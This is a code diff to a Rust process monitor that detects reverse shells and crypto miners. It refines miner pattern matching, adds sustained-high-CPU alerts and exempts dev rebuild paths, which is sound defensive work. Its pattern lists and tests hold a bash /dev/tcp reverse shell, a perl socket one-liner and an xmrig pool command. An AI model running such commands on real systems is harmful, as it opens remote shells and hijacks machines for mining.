@@ -11,8 +11,8 @@ use super::{DetectionCategory, RecommendedAction, ScanResult, Severity};
 use parking_lot::RwLock;
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
-use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, Ordering};
 use std::time::Instant;
 
 /// Reverse shell command-line patterns.
@@ -38,25 +38,33 @@ const REVERSE_SHELL_PATTERNS: &[&str] = &[
     "openssl s_client -connect",
 ];
 
-/// Crypto miner command-line patterns.
-const MINER_PATTERNS: &[&str] = &[
+/// Unambiguous miner markers — strings that effectively never appear outside
+/// real mining traffic. Substring match anywhere in cmdline is safe.
+const MINER_MARKERS: &[&str] = &[
     "stratum+tcp://",
     "stratum+ssl://",
+    "cryptonight",
+    "randomx",
+    "kawpow",
+    "pool.minergate",
+    "pool.minexmr",
+    "nicehash",
+];
+
+/// Miner binary names — these can legitimately appear as data inside other
+/// processes' argv (test source, grep queries, log lines, package names).
+/// Match only against `comm` and the basename of argv[0], never the full
+/// cmdline. Avoids false positives like `bash -c 'grep xmrig logs/*'`.
+const MINER_BINARIES: &[&str] = &[
     "xmrig",
     "minerd",
     "cpuminer",
-    "cryptonight",
     "ethminer",
     "nbminer",
     "phoenixminer",
     "t-rex",
     "lolminer",
     "gminer",
-    "randomx",
-    "kawpow",
-    "pool.minergate",
-    "pool.minexmr",
-    "nicehash",
 ];
 
 /// Configuration for the process monitor.
@@ -89,6 +97,10 @@ struct ProcessInfo {
     cpu_ticks: u64,
     first_seen: Instant,
     high_cpu_since: Option<Instant>,
+    /// True once we've emitted a sustained-high-CPU detection for this PID.
+    /// Prevents re-firing every scan interval while the process stays hot.
+    /// Resets to false if CPU drops back to normal.
+    high_cpu_alerted: bool,
 }
 
 /// Real-time process behavior monitor.
@@ -151,6 +163,7 @@ impl ProcessMonitor {
                 cpu_ticks,
                 first_seen: Instant::now(),
                 high_cpu_since: None,
+                high_cpu_alerted: false,
             };
 
             // Check if this is a NEW process
@@ -180,31 +193,56 @@ impl ProcessMonitor {
                     }
                 }
 
-                // Check for crypto miner patterns
-                for pattern in MINER_PATTERNS {
+                // Check for crypto miner markers (substring anywhere — safe).
+                let mut miner_hit: Option<&str> = None;
+                for pattern in MINER_MARKERS {
                     if cmdline_lower.contains(&pattern.to_lowercase()) {
-                        results.push(ScanResult::new(
-                            "process_monitor",
-                            format!("pid:{} ({})", pid, comm),
-                            Severity::High,
-                            DetectionCategory::SuspiciousProcess {
-                                pid,
-                                name: comm.clone(),
-                            },
-                            format!(
-                                "Crypto miner detected — PID {} ({}) cmdline matches pattern: '{}'",
-                                pid, comm, pattern
-                            ),
-                            0.85,
-                            RecommendedAction::KillProcess { pid },
-                        ));
+                        miner_hit = Some(pattern);
                         break;
                     }
                 }
+                // Check for miner binary names (comm + argv[0] basename only).
+                if miner_hit.is_none() {
+                    let comm_lower = comm.to_lowercase();
+                    let argv0_base = cmdline
+                        .split('\0')
+                        .next()
+                        .unwrap_or("")
+                        .rsplit('/')
+                        .next()
+                        .unwrap_or("")
+                        .to_lowercase();
+                    for pattern in MINER_BINARIES {
+                        let p = pattern.to_lowercase();
+                        if comm_lower == p || argv0_base == p {
+                            miner_hit = Some(pattern);
+                            break;
+                        }
+                    }
+                }
+                if let Some(pattern) = miner_hit {
+                    results.push(ScanResult::new(
+                        "process_monitor",
+                        format!("pid:{} ({})", pid, comm),
+                        Severity::High,
+                        DetectionCategory::SuspiciousProcess {
+                            pid,
+                            name: comm.clone(),
+                        },
+                        format!(
+                            "Crypto miner detected — PID {} ({}) matches pattern: '{}'",
+                            pid, comm, pattern
+                        ),
+                        0.85,
+                        RecommendedAction::KillProcess { pid },
+                    ));
+                }
             }
 
-            // Check for deleted executable (common after injection)
-            if exe.contains("(deleted)") {
+            // Check for deleted executable (common after injection, but also
+            // the normal state of any dev binary whose source was rebuilt
+            // while the process was still running — skip those).
+            if exe.contains("(deleted)") && !is_dev_rebuild_path(&exe) {
                 results.push(ScanResult::new(
                     "process_monitor",
                     format!("pid:{} ({})", pid, comm),
@@ -225,6 +263,85 @@ impl ProcessMonitor {
             current_pids.insert(pid, info);
         }
 
+        // ── CPU-based detection — reads all stored ProcessInfo fields ──────────
+        // Compare cpu_ticks against the previous scan to detect sustained high
+        // CPU usage (crypto miners, runaway processes) using the stored state.
+        {
+            let known = self.known_pids.read();
+            for (pid, info) in current_pids.iter_mut() {
+                // Skip allowlisted process names (reads info.name)
+                let lower_name = info.name.to_lowercase();
+                if self
+                    .config
+                    .allowlist_names
+                    .iter()
+                    .any(|a| lower_name.contains(&a.to_lowercase()))
+                {
+                    continue;
+                }
+
+                if let Some(prev) = known.get(pid) {
+                    // Delta in jiffies since last poll (reads cpu_ticks from both)
+                    let tick_delta = info.cpu_ticks.saturating_sub(prev.cpu_ticks);
+                    let poll_secs = self.config.poll_interval_ms as f64 / 1000.0;
+                    // Estimate single-core CPU% (jiffies run at 100 Hz)
+                    let cpu_pct = if poll_secs > 0.0 {
+                        (tick_delta as f64 / (100.0 * poll_secs)) * 100.0
+                    } else {
+                        0.0
+                    };
+
+                    if cpu_pct >= self.config.crypto_cpu_threshold {
+                        // Inherit the timer + alerted flag from the previous scan.
+                        info.high_cpu_since = prev.high_cpu_since.or(Some(prev.first_seen));
+                        info.high_cpu_alerted = prev.high_cpu_alerted;
+
+                        // Dev binaries are expected to burn CPU (ML training,
+                        // compilation, local inference servers, etc.). Skip the
+                        // sustained-CPU heuristic entirely for them.
+                        if is_dev_rebuild_path(&info.exe) {
+                            continue;
+                        }
+
+                        if let Some(since) = info.high_cpu_since {
+                            let long_enough =
+                                since.elapsed().as_secs() >= self.config.crypto_duration_secs;
+                            // Fire exactly once per incident — not every poll.
+                            if long_enough && !info.high_cpu_alerted {
+                                info.high_cpu_alerted = true;
+                                results.push(ScanResult::new(
+                                    "process_monitor",
+                                    &format!("/proc/{}/exe", pid),
+                                    Severity::High,
+                                    DetectionCategory::SuspiciousProcess {
+                                        pid: *pid,
+                                        name: info.name.clone(),
+                                    },
+                                    format!(
+                                        "Sustained high CPU {:.0}% for {}s — PID {} ({}) exe:{} ppid:{} cmdline:{}",
+                                        cpu_pct,
+                                        since.elapsed().as_secs(),
+                                        info.pid,
+                                        info.name,
+                                        info.exe,
+                                        info.ppid,
+                                        info.cmdline.chars().take(80).collect::<String>(),
+                                    ),
+                                    0.75,
+                                    RecommendedAction::Alert,
+                                ));
+                            }
+                        }
+                    } else {
+                        // CPU back to normal — clear the sustained-CPU timer
+                        // and re-arm the alert so a later spike will re-fire.
+                        info.high_cpu_since = None;
+                        info.high_cpu_alerted = false;
+                    }
+                }
+            }
+        }
+
         // Update known PIDs
         *self.known_pids.write() = current_pids;
 
@@ -240,8 +357,7 @@ impl ProcessMonitor {
         let interval_ms = self.config.poll_interval_ms;
 
         tokio::spawn(async move {
-            let mut interval =
-                tokio::time::interval(std::time::Duration::from_millis(interval_ms));
+            let mut interval = tokio::time::interval(std::time::Duration::from_millis(interval_ms));
 
             while running.load(Ordering::Relaxed) {
                 interval.tick().await;
@@ -266,10 +382,42 @@ fn read_proc_file(pid: u32, file: &str) -> Option<String> {
     std::fs::read_to_string(format!("/proc/{}/{}", pid, file)).ok()
 }
 
+/// True when a `(deleted)` exe path looks like a dev rebuild rather than a
+/// suspicious injection. Cargo/Go/Node build outputs land in predictable
+/// locations, and rebuilding while the old process is still running leaves
+/// the kernel showing the old exe as `(deleted)`. That's expected on a dev
+/// workstation — don't flag it.
+fn is_dev_rebuild_path(exe: &str) -> bool {
+    // Strip the " (deleted)" suffix the kernel appends.
+    let path = exe.trim_end_matches(" (deleted)");
+    // Cargo build outputs: /opt/*/target/{debug,release}/...
+    // Also /home/*/target/... and /tmp/cargo-target/*.
+    let dev_markers = [
+        "/target/release/",
+        "/target/debug/",
+        "/target/x86_64-",
+        "/target/aarch64-",
+        ".cargo/bin/",
+        "/node_modules/.bin/",
+        "/.rustup/toolchains/",
+        "/opt/AxonML/",       // dev tree rebuilds frequently
+        "/opt/NexusShield/",  // this project rebuilds frequently
+        "/opt/NexusEdge_Rust/",
+        "/opt/Ferrum",
+        "/opt/NexusOracle/",
+        "/opt/NexusPulse/",
+        "/opt/NexusVault/",
+    ];
+    dev_markers.iter().any(|m| path.contains(m))
+}
+
 /// Read /proc/[pid]/cmdline, replacing null bytes with spaces.
 fn read_proc_cmdline(pid: u32) -> Option<String> {
     let data = std::fs::read(format!("/proc/{}/cmdline", pid)).ok()?;
-    let s: String = data.iter().map(|&b| if b == 0 { ' ' } else { b as char }).collect();
+    let s: String = data
+        .iter()
+        .map(|&b| if b == 0 { ' ' } else { b as char })
+        .collect();
     Some(s.trim().to_string())
 }
 
@@ -302,12 +450,20 @@ pub fn matches_reverse_shell(cmdline: &str) -> bool {
         .any(|p| lower.contains(&p.to_lowercase()))
 }
 
-/// Check if a command line matches any miner pattern.
+/// Check if a command line matches any miner pattern. Mirrors the scan-loop
+/// logic: markers match anywhere; binary names match only argv[0] basename.
+/// Accepts both null-separated (/proc format) and whitespace-separated argv.
 pub fn matches_miner(cmdline: &str) -> bool {
     let lower = cmdline.to_lowercase();
-    MINER_PATTERNS
-        .iter()
-        .any(|p| lower.contains(&p.to_lowercase()))
+    if MINER_MARKERS.iter().any(|p| lower.contains(&p.to_lowercase())) {
+        return true;
+    }
+    let argv0 = cmdline
+        .split(|c: char| c == '\0' || c.is_whitespace())
+        .next()
+        .unwrap_or("");
+    let argv0_base = argv0.rsplit('/').next().unwrap_or("").to_lowercase();
+    MINER_BINARIES.iter().any(|p| argv0_base == p.to_lowercase())
 }
 
 #[cfg(test)]
@@ -316,7 +472,9 @@ mod tests {
 
     #[test]
     fn reverse_shell_bash_tcp() {
-        assert!(matches_reverse_shell("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"));
+        assert!(matches_reverse_shell(
+            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+        ));
     }
 
     #[test]
@@ -333,7 +491,9 @@ mod tests {
 
     #[test]
     fn reverse_shell_perl() {
-        assert!(matches_reverse_shell("perl -e 'use Socket;$i=\"10.0.0.1\"'"));
+        assert!(matches_reverse_shell(
+            "perl -e 'use Socket;$i=\"10.0.0.1\"'"
+        ));
     }
 
     #[test]
@@ -345,18 +505,33 @@ mod tests {
 
     #[test]
     fn miner_xmrig() {
-        assert!(matches_miner("./xmrig --url stratum+tcp://pool.minexmr.com:4444"));
+        assert!(matches_miner(
+            "./xmrig --url stratum+tcp://pool.minexmr.com:4444"
+        ));
     }
 
     #[test]
     fn miner_stratum() {
-        assert!(matches_miner("miner --pool stratum+ssl://us-east.stratum.slushpool.com"));
+        assert!(matches_miner(
+            "miner --pool stratum+ssl://us-east.stratum.slushpool.com"
+        ));
     }
 
     #[test]
     fn normal_process_not_miner() {
         assert!(!matches_miner("python3 train_model.py --epochs 100"));
         assert!(!matches_miner("gcc -O2 main.c -o main"));
+    }
+
+    #[test]
+    fn miner_name_as_data_not_miner() {
+        // Regression: bash/grep/ripgrep referencing the literal string "xmrig"
+        // in their args should NOT trip the miner detector. Only argv[0]
+        // basename or unambiguous markers should fire.
+        assert!(!matches_miner("bash -c grep\0xmrig\0/var/log/auth.log"));
+        assert!(!matches_miner("rg xmrig /opt/NexusShield/src"));
+        assert!(!matches_miner("cargo test miner_xmrig"));
+        assert!(!matches_miner("vim allowlist.rs  // exempt xmrig"));
     }
 
     #[test]
